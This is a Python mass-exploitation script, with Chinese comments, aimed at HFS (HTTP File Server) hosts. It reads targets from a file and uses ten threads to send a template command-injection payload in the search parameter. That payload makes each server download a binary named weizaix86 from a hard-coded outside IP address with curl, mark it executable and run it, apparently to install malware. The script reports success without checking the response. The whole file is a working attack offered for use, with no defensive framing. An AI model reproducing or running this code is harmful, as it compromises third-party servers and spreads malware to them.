import requests
import threading
import queue
import urllib3

# 屏蔽SSL不安全的警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 从HFS.txt文件中读取URL或IP
def read_urls(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    urls = [line.strip() for line in lines if line.strip()]
    return urls

# 判断URL是否有协议头，若无则加上http://
def format_url(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url
    return url

# 执行命令注入攻击
def check_url(url, queue):
    formatted_url = format_url(url)
    try:
        headers = {
            "Host": "{{file:line(D:\\yakit\\yakit-projects\\temp\\tmp2340581901.txt)}}",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close"
        }
        params = {
            'n': '%0A',
            'cmd': 'curl -O http://199.204.96.234:3232/weizaix86;chmod 777 weizaix86;./weizaix86',
            'search': '%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}'
        }
        response = requests.get(formatted_url, headers=headers, params=params, verify=False, timeout=10)
        print(f"[SUCCESS] Command executed on {url}")
    except requests.RequestException as e:
        print(f"[FAILED] Could not execute command on {url}: {e}")
    queue.task_done()

# 主函数，读取URL并使用队列和多线程执行任务
def main():
    urls = read_urls('HFS.txt')
    url_queue = queue.Queue()
    num_threads = 10

    # 将URL放入队列
    for url in urls:
        url_queue.put(url)

    # 创建线程
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(url_queue,))
        thread.daemon = True
        threads.append(thread)

    # 启动线程
    for thread in threads:
        thread.start()

    # 等待队列中的所有任务完成
    url_queue.join()

# 工作线程函数
def worker(queue):
    while True:
        url = queue.get()
        if url is None:
            break
        check_url(url, queue)

if __name__ == '__main__':
    main()